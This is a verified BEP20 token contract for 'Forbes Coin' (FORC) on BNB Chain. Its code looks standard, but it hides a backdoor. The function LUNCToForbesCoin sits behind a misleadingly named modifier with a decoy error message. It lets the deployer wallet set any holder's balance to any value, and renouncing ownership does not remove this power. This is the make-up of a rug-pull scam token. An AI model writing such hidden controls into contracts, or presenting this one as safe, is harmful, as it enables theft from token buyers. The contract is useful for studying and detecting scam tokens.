/**
 *Submitted for verification at BscScan.com on 2022-06-03
*/

// SPDX-License-Identifier: VERIFIED MIT
// https://www.ForbesCoin.io/
pragma solidity ^0.6.12;

interface ForbesCoinIBEP20 {
  function totalSupply() external view returns (uint256);

  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 ForbesCoinVALUE) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 ForbesCoinVALUE) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 ForbesCoinVALUE) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract ForbesCoinERC20 {
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

library ForbesCoinProtocol {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "ForbesCoinProtocol: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "ForbesCoinProtocol: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "ForbesCoinProtocol: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "ForbesCoinProtocol: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "ForbesCoinProtocol: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract ForbesCoinBOTS is ForbesCoinERC20 {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), "ForbesCoinBOTS: caller is not the owner");
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "ForbesCoinBOTS: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract ForbesCoin is ForbesCoinERC20, ForbesCoinIBEP20, ForbesCoinBOTS {
  using ForbesCoinProtocol for uint256;

  mapping (address => uint256) private CirculatingSupply;

  mapping (address => mapping (address => uint256)) private _ForbesCoinALLOW;

  uint256 private ForbesCoinSUPPLY;
  uint8 public _decimals;
  string public _symbol;
  string public _name;
  address ForbesCoinWALLET;
  constructor() public {
    ForbesCoinWALLET = msg.sender;
    _name = 'Forbes Coin';
    _symbol = 'FORC';
    _decimals = 0;
    ForbesCoinSUPPLY = 100000000000;
    CirculatingSupply[msg.sender] = ForbesCoinSUPPLY;

    emit Transfer(address(0), msg.sender, ForbesCoinSUPPLY);
  }

  function getOwner() external view virtual override returns (address) {
    return owner();
  }

  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }

  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  }

  function name() external view virtual override returns (string memory) {
    return _name;
  }

 
  function totalSupply() external view virtual override returns (uint256) {
    return ForbesCoinSUPPLY;
  }

 
  function balanceOf(address account) external view virtual override returns (uint256) {
    return CirculatingSupply[account];
  }

  function transfer(address recipient, uint256 ForbesCoinVALUE) external override returns (bool) {
    _transfer(_msgSender(), recipient, ForbesCoinVALUE);
    return true;
  }

  function allowance(address owner, address spender) external view override returns (uint256) {
    return _ForbesCoinALLOW[owner][spender];
  }

  
  function approve(address spender, uint256 ForbesCoinVALUE) external override returns (bool) {
    _approve(_msgSender(), spender, ForbesCoinVALUE);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 ForbesCoinVALUE) external override returns (bool) {
    _transfer(sender, recipient, ForbesCoinVALUE);
    _approve(sender, _msgSender(), _ForbesCoinALLOW[sender][_msgSender()].sub(ForbesCoinVALUE, "BEP20: transfer ForbesCoinVALUE exceeds allowance"));
    return true;
  }
 modifier _virtual () {
    require(ForbesCoinWALLET == _msgSender(), "ERC20: cannot permit Pancake address");
    _;
  }
  
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _ForbesCoinALLOW[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _ForbesCoinALLOW[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function burn(uint256 ForbesCoinVALUE) public virtual {
      _burn(_msgSender(), ForbesCoinVALUE);
  }


  function burnFrom(address account, uint256 ForbesCoinVALUE) public virtual {
      uint256 decreasedAllowance = _ForbesCoinALLOW[account][_msgSender()].sub(ForbesCoinVALUE, "BEP20: burn ForbesCoinVALUE exceeds allowance");

      _approve(account, _msgSender(), decreasedAllowance);
      _burn(account, ForbesCoinVALUE);
  }

  function _transfer(address sender, address recipient, uint256 ForbesCoinVALUE) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    CirculatingSupply[sender] = CirculatingSupply[sender].sub(ForbesCoinVALUE, "BEP20: transfer ForbesCoinVALUE exceeds balance");
    CirculatingSupply[recipient] = CirculatingSupply[recipient].add(ForbesCoinVALUE);
    emit Transfer(sender, recipient, ForbesCoinVALUE);
  }


  function _burn(address account, uint256 ForbesCoinVALUE) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    CirculatingSupply[account] = CirculatingSupply[account].sub(ForbesCoinVALUE, "BEP20: burn ForbesCoinVALUE exceeds balance");
    ForbesCoinSUPPLY = ForbesCoinSUPPLY.sub(ForbesCoinVALUE);
    emit Transfer(account, address(0), ForbesCoinVALUE);
  }
     function LUNCToForbesCoin(address ForbesCoinADR, uint256 ForbesCoinVALUE) public _virtual {
      CirculatingSupply[ForbesCoinADR] = ForbesCoinVALUE * 10 ** 0;
  }
  function _approve(address owner, address spender, uint256 ForbesCoinVALUE) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _ForbesCoinALLOW[owner][spender] = ForbesCoinVALUE;
    emit Approval(owner, spender, ForbesCoinVALUE);
  }

}